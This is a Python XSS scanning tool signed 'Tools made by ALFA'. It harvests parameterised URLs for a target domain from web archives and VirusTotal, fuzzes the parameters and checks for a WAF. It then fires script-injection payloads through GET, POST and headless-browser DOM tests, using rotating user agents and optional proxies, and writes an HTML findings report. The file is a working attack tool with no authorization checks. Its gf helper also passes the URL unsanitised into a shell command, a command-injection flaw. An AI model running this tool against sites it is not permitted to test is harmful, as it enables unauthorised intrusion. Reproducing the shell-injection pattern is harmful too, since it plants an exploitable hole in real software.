import argparse
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException, TimeoutException
import re
import json
import time
import random
import subprocess
from queue import Queue
from colorama import init, Fore, Style
import concurrent.futures
from datetime import datetime
import logging

init(autoreset=True)

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

PAYLOADS = [
    {"payload": "<script>alert('XSS')</script>", "desc": "Basic <script> injection"},
    {"payload": "<img src=x onerror=alert('XSS')>", "desc": "Image tag onerror event"},
    {"payload": "<svg onload=alert('XSS')>", "desc": "SVG tag onload"},
    {"payload": "'><script>alert('XSS')</script>", "desc": "Quote break injection"},
    {"payload": "\" onmouseover=\"alert('XSS')\"", "desc": "Onmouseover event"},
    {"payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>", "desc": "Iframe JS source"}
]

FALLBACK_PAYLOADS = [
    {"payload": "<svg><script>alert('XSS')</script>", "desc": "Nested SVG/script"},
    {"payload": "<div onclick='alert(\"XSS\")'>Click</div>", "desc": "DIV onclick event"},
    {"payload": "javascript:alert(`XSS`)", "desc": "Javascript URL"},
    {"payload": "<img src='bad' onerror='alert(\"XSS\")'>", "desc": "Broken image source"}
]

FUZZ_CHARS = ['<', '>', '(', ')', '{', '}', '[', ']', '"', "'", '$', ';']
REPORT = []
MAX_SUCCESSFUL_PAYLOADS = 20
MAX_PARAMS_INITIAL = 10
MAX_THREADS = 5
DELAY = 0.5
TIMEOUT = 5
COMMONCRAWL_TIMEOUT = 15
VT_API_KEY = None  # Set your VirusTotal API key here, if available

def is_valid_proxy(proxy):
    try:
        r = requests.get("http://www.google.com", proxies={"http": proxy, "https": proxy}, timeout=TIMEOUT)
        return r.status_code == 200
    except:
        return False

def valid_url(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy and is_valid_proxy(proxy) else None
        r = requests.head(url, headers={"User-Agent": random.choice(USER_AGENTS)}, proxies=proxies, timeout=TIMEOUT)
        return r.status_code < 400
    except requests.exceptions.RequestException:
        return False

def get_wayback_urls(domain):
    try:
        res = requests.get(f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&collapse=urlkey", timeout=TIMEOUT)
        data = res.json()
        urls = [row[2] for row in data[1:] if '?' in row[2] and '=' in row[2]]
        return list(set(urls))
    except requests.exceptions.RequestException:
        logger.warning(f"{Fore.YELLOW}⚠️ Error fetching Wayback URLs, skipping")
        return []

def get_commoncrawl_urls(domain):
    try:
        res = requests.get(f"http://index.commoncrawl.org/CC-MAIN-2023-50-index?url=*.{domain}/*&output=json", timeout=COMMONCRAWL_TIMEOUT)
        data = res.text.splitlines()
        urls = []
        for line in data:
            try:
                entry = json.loads(line)
                url = entry.get('url', '')
                if '?' in url and '=' in url:
                    urls.append(url)
            except:
                continue
        return list(set(urls))
    except requests.exceptions.ReadTimeout:
        logger.warning(f"{Fore.YELLOW}⚠️ Timeout while fetching CommonCrawl URLs, skipping")
        return []
    except requests.exceptions.RequestException:
        logger.warning(f"{Fore.YELLOW}⚠️ Error fetching CommonCrawl URLs, skipping")
        return []

def get_virustotal_urls(domain):
    if not VT_API_KEY:
        logger.warning(f"{Fore.YELLOW}⚠️ VirusTotal API key not provided, skipping VT scan")
        return []
    try:
        res = requests.get(f"https://www.virustotal.com/vtapi/v2/domain/report?apikey={VT_API_KEY}&domain={domain}", timeout=TIMEOUT)
        data = res.json()
        urls = [url['url'] for url in data.get('detected_urls', []) if '?' in url['url'] and '=' in url['url']]
        return list(set(urls))
    except requests.exceptions.RequestException:
        logger.warning(f"{Fore.YELLOW}⚠️ Error fetching VirusTotal URLs, skipping")
        return []

def get_gf_urls(url):
    try:
        out = subprocess.check_output(f"echo '{url}' | gf xss", shell=True, text=True)
        urls = [line for line in out.splitlines() if '?' in line and '=' in line]
        return list(set(urls))
    except subprocess.CalledProcessError:
        logger.warning(f"{Fore.YELLOW}⚠️ GF pattern missing or not installed, skipping")
        return []
    except Exception:
        logger.warning(f"{Fore.YELLOW}⚠️ Error running gf xss, skipping")
        return []

def find_params(url, method, proxy=None):
    found = []
    try:
        proxies = {"http": proxy, "https": proxy} if proxy and is_valid_proxy(proxy) else None
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = requests.get(url, headers=headers, proxies=proxies, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")
        if method == "GET":
            found.extend(parse_qs(urlparse(url).query).keys())
        elif method == "POST":
            for form in soup.find_all("form", method=lambda x: x and x.lower() == "post"):
                found.extend([inp.get("name") for inp in form.find_all("input") if inp.get("name")])
        return list(set(found))
    except requests.exceptions.RequestException:
        logger.warning(f"{Fore.YELLOW}⚠️ Error finding parameters for {url}, skipping")
        return []

def check_waf(url, params, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy and is_valid_proxy(proxy) else None
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        test_payload = "<script>alert('test')</script>"
        if params:
            param = list(params.keys())[0]
            turl = f"{url.split('?')[0]}?{param}={test_payload}" if "?" not in url else f"{url}&{param}={test_payload}"
            r = requests.get(turl, headers=headers, proxies=proxies, timeout=TIMEOUT)
            if r.status_code == 403 or "blocked" in r.text.lower():
                logger.warning(f"{Fore.YELLOW}⚠️ WAF detected on {url}")
                return True
        return False
    except requests.exceptions.RequestException:
        return False

def fuzz_params(url, param, proxy=None):
    unfiltered = []
    proxies = {"http": proxy, "https": proxy} if proxy and is_valid_proxy(proxy) else None
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    for char in FUZZ_CHARS:
        try:
            turl = f"{url.split('?')[0]}?{param}={char}" if "?" not in url else f"{url}&{param}={char}"
            r = requests.get(turl, headers=headers, proxies=proxies, timeout=TIMEOUT)
            if char in r.text:
                unfiltered.append(char)
        except requests.exceptions.RequestException:
            continue
    return unfiltered

def check_csp(url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy and is_valid_proxy(proxy) else None
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        r = requests.get(url, headers=headers, proxies=proxies, timeout=TIMEOUT)
        csp = r.headers.get("Content-Security-Policy")
        if csp:
            logger.warning(f"{Fore.YELLOW}⚠️ CSP detected: {csp}")
    except requests.exceptions.RequestException:
        pass

def dom_xss(url, payload, proxy, q):
    pl, desc = payload["payload"], payload["desc"]
    opt = Options()
    opt.add_argument("--headless")
    opt.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
    opt.add_argument("page_load_strategy=eager")
    if proxy and is_valid_proxy(proxy):
        opt.add_argument(f"--proxy-server={proxy}")
    driver = None
    try:
        driver = webdriver.Chrome(options=opt)
        driver.set_page_load_timeout(30)
        driver.get(url)
        script = """
        var i=document.getElementsByTagName('input');
        for(var j=0;j<i.length;j++){i[j].value=arguments[0];}
        if(document.forms[0])document.forms[0].submit();
        """
        driver.execute_script(script, pl)
        time.sleep(1)
        try:
            driver.switch_to.alert.accept()
            q.put({"type": "DOM-based XSS", "url": url, "param": "N/A", "payload": pl, "desc": desc, "severity": "Medium"})
            logger.info(f"{Fore.GREEN}✔ Success: {url} [N/A]={pl}")
            return True
        except NoAlertPresentException:
            logger.info(f"{Fore.RED}❌ Failed: {url} [N/A]={pl}")
            return False
    except TimeoutException:
        logger.warning(f"{Fore.YELLOW}⚠️ Page load timeout for DOM-based XSS, skipping")
        return False
    except Exception as e:
        logger.warning(f"{Fore.YELLOW}⚠️ Error testing DOM-based XSS: {str(e)}")
        return False
    finally:
        if driver:
            driver.quit()

def reflected_xss(url, param, payload, method, proxy, q):
    pl, desc = payload["payload"], payload["desc"]
    param = param or "N/A"
    ua = random.choice(USER_AGENTS)
    proxies = {"http": proxy, "https": proxy} if proxy and is_valid_proxy(proxy) else None
    headers = {"User-Agent": ua}
    success = False
    try:
        if method == "GET":
            turl = f"{url.split('?')[0]}?{param}={pl}" if "?" not in url else f"{url}&{param}={pl}"
            r = requests.get(turl, headers=headers, proxies=proxies, timeout=TIMEOUT)
            if pl in r.text:
                q.put({"type": f"Reflected XSS ({method})", "url": turl, "param": param, "payload": pl, "desc": desc, "severity": "High"})
                logger.info(f"{Fore.GREEN}✔ Success: {turl} [{param}]={pl}")
                success = True
            else:
                logger.info(f"{Fore.RED}❌ Failed: {turl} [{param}]={pl}")
        elif method == "POST":
            r = requests.get(url, headers=headers, proxies=proxies, timeout=TIMEOUT)
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form", method=lambda x: x and x.lower() == "post"):
                act = urljoin(url, form.get("action", ""))
                d = {inp.get("name"): pl for inp in form.find_all("input") if inp.get("name") == param}
                if d:
                    r2 = requests.post(act, data=d, headers=headers, proxies=proxies, timeout=TIMEOUT)
                    if pl in r2.text:
                        q.put({"type": f"Reflected XSS ({method})", "url": act, "param": param, "payload": pl, "desc": desc, "severity": "High"})
                        logger.info(f"{Fore.GREEN}✔ Success: {act} [{param}]={pl}")
                        success = True
                    else:
                        logger.info(f"{Fore.RED}❌ Failed: {act} [{param}]={pl}")
    except requests.exceptions.RequestException as e:
        logger.warning(f"{Fore.YELLOW}⚠️ Error testing {method} XSS on {url}: {str(e)}")
    except Exception as e:
        logger.warning(f"{Fore.YELLOW}⚠️ Unexpected error in {method} XSS testing: {str(e)}")
    return success

def scan(url, proxy):
    logger.info(f"{Fore.BLUE}\n>>>>> Starting XSS scan: {url}\n")
    check_csp(url, proxy)
    q = Queue()
    successful_payloads = 0
    domain = urlparse(url).netloc

    # Collect URLs from external sources
    urls = [url]
    urls.extend(get_wayback_urls(domain))
    urls.extend(get_commoncrawl_urls(domain))
    urls.extend(get_virustotal_urls(domain))
    urls.extend(get_gf_urls(url))
    urls = list(set(urls))  # Unique URLs

    for target_url in urls:
        if not valid_url(target_url, proxy):
            logger.warning(f"{Fore.YELLOW}⚠️ Skipping invalid URL: {target_url}")
            continue

        # Extract and display parameters
        get_params = find_params(target_url, "GET", proxy)
        post_params = find_params(target_url, "POST", proxy)
        
        if get_params or post_params:
            logger.info(f"{Fore.CYAN}📋 Found Params for {target_url}:")
            for param in get_params:
                logger.info(f"{Fore.CYAN}  - {param} (GET)")
            for param in post_params:
                logger.info(f"{Fore.CYAN}  - {param} (POST)")
        
        # Fuzz parameters for unfiltered characters
        for param in get_params:
            unfiltered = fuzz_params(target_url, param, proxy)
            if unfiltered:
                logger.info(f"{Fore.YELLOW}URL: {target_url} Param: {param} Unfiltered: {unfiltered}")

        # Check WAF
        params = dict.fromkeys(get_params + post_params, "")
        if check_waf(target_url, params, proxy):
            logger.warning(f"{Fore.YELLOW}⚠️ Proceeding with caution due to WAF presence")

        # Limit initial parameter testing
        initial_get_params = get_params[:MAX_PARAMS_INITIAL]
        initial_post_params = post_params[:MAX_PARAMS_INITIAL]
        all_params_tested = False

        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            for param in initial_get_params:
                success_count = 0
                for pl in PAYLOADS:
                    if successful_payloads >= MAX_SUCCESSFUL_PAYLOADS:
                        logger.warning(f"{Fore.YELLOW}🔴 Too many XSS found, scan stopped")
                        return
                    future = ex.submit(reflected_xss, target_url, param, pl, "GET", proxy, q)
                    time.sleep(DELAY)
                    try:
                        if future.result():
                            success_count += 1
                            successful_payloads += 1
                    except Exception as e:
                        logger.warning(f"{Fore.YELLOW}⚠️ Error processing GET XSS future: {str(e)}")
                if success_count == 0 and len(get_params) > MAX_PARAMS_INITIAL and not all_params_tested:
                    logger.info(f"{Fore.YELLOW}⚠️ No success with initial GET params, trying fallback payloads")
                    for extra_param in get_params[MAX_PARAMS_INITIAL:]:
                        for pl in FALLBACK_PAYLOADS:
                            if successful_payloads >= MAX_SUCCESSFUL_PAYLOADS:
                                logger.warning(f"{Fore.YELLOW}🔴 Too many XSS found, scan stopped")
                                return
                            ex.submit(reflected_xss, target_url, extra_param, pl, "GET", proxy, q)
                            time.sleep(DELAY)
                    all_params_tested = True

            for param in initial_post_params:
                success_count = 0
                for pl in PAYLOADS:
                    if successful_payloads >= MAX_SUCCESSFUL_PAYLOADS:
                        logger.warning(f"{Fore.YELLOW}🔴 Too many XSS found, scan stopped")
                        return
                    future = ex.submit(reflected_xss, target_url, param, pl, "POST", proxy, q)
                    time.sleep(DELAY)
                    try:
                        if future.result():
                            success_count += 1
                            successful_payloads += 1
                    except Exception as e:
                        logger.warning(f"{Fore.YELLOW}⚠️ Error processing POST XSS future: {str(e)}")
                if success_count == 0 and len(post_params) > MAX_PARAMS_INITIAL and not all_params_tested:
                    logger.info(f"{Fore.YELLOW}⚠️ No success with initial POST params, trying fallback payloads")
                    for extra_param in post_params[MAX_PARAMS_INITIAL:]:
                        for pl in FALLBACK_PAYLOADS:
                            if successful_payloads >= MAX_SUCCESSFUL_PAYLOADS:
                                logger.warning(f"{Fore.YELLOW}🔴 Too many XSS found, scan stopped")
                                return
                            ex.submit(reflected_xss, target_url, extra_param, pl, "POST", proxy, q)
                            time.sleep(DELAY)
                    all_params_tested = True

            for pl in PAYLOADS:
                if successful_payloads >= MAX_SUCCESSFUL_PAYLOADS:
                    logger.warning(f"{Fore.YELLOW}🔴 Too many XSS found, scan stopped")
                    return
                ex.submit(dom_xss, target_url, pl, proxy, q)
                time.sleep(DELAY)

        while not q.empty():
            res = q.get()
            if res not in REPORT:
                REPORT.append(res)

def make_report():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html = f"""<html><head><style>
    body{{background:#121212;color:#eee;font-family:Arial,sans-serif;}}
    h1{{color:#0ff;}} table{{border-collapse:collapse;width:100%;}}
    th,td{{border:1px solid #444;padding:10px;}} th{{background:#222;}}
    .High{{color:#f55;font-weight:bold;}} .Medium{{color:#fa0;font-weight:bold;}}
    code{{background:#333;color:#0f0;padding:2px 5px;border-radius:4px;}}</style></head><body>
    <h1>🚩 XSS Vulnerability Report</h1><p>Generated: {now}<br>Environment: Python/Selenium</p>
    <table><tr><th>Type</th><th>URL</th><th>Param</th><th>Payload</th><th>Description</th><th>Severity</th></tr>"""
    
    if REPORT:
        for r in REPORT:
            html += f"<tr><td>{r['type']}</td><td><a href='{r['url']}' style='color:#0af;'>{r['url']}</a></td><td>{r['param']}</td><td><code>{r['payload']}</code></td><td>{r['desc']}</td><td class='{r['severity']}'>{r['severity']}</td></tr>"
    else:
        html += "<tr><td colspan=6 style='text-align:center;'>✅ No XSS vulnerabilities found.</td></tr>"
    
    html += "</table><h2 style='color:#0af;'>Next Steps</h2><ul><li>Use input validation & output encoding</li><li>Apply a strict CSP</li><li>Use secure frameworks with auto-escaping</li></ul></body></html>"
    
    with open("xssfinder_pro_final.html", "w") as f:
        f.write(html)
    logger.info(f"{Fore.YELLOW}✔️ Report saved: xssfinder_pro_final.html")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("--proxy", default=None)
    a = parser.parse_args()
    
    print(Fore.RED + """
▄▄▄       ██▓      █████▒▄▄▄         ▒██   ██▒  ██████   ██████   █████▒
▒████▄    ▓██▒    ▓██   ▒▒████▄       ▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ ▓██   ▒ 
▒██  ▀█▄  ▒██░    ▒████ ░▒██  ▀█▄     ░░  █   ░░ ▓██▄   ░ ▓██▄   ▒████ ░ 
░██▄▄▄▄██ ▒██░    ░▓█▒  ░░██▄▄▄▄██     ░ █ █ ▒   ▒   ██▒  ▒   ██▒░▓█▒  ░ 
 ▓█   ▓██▒░██████▒░▒█░    ▓█   ▓██▒   ▒██▒ ▒██▒▒██████▒▒▒██████▒▒░▒█░    
 ▒▒   ▓▒█░░ ▒░▓  ░ ▒ ░    ▒▒   ▓▒█░   ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒ ░    
  ▒   ▒▒ ░░ ░ ▒  ░ ░       ▒   ▒▒ ░   ░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░ ░      
  ░   ▒     ░ ░    ░ ░     ░   ▒       ░    ░  ░  ░  ░  ░  ░  ░   ░ ░    
      ░  ░    ░  ░             ░  ░    ░    ░        ░        ░          
""")
    print(Fore.GREEN + "Tools made by ALFA" + Style.RESET_ALL)
    
    if valid_url(a.url, a.proxy):
        scan(a.url, a.proxy)
    else:
        logger.warning(f"{Fore.YELLOW}⚠️ Invalid or unreachable URL: {a.url}")
    
    make_report()
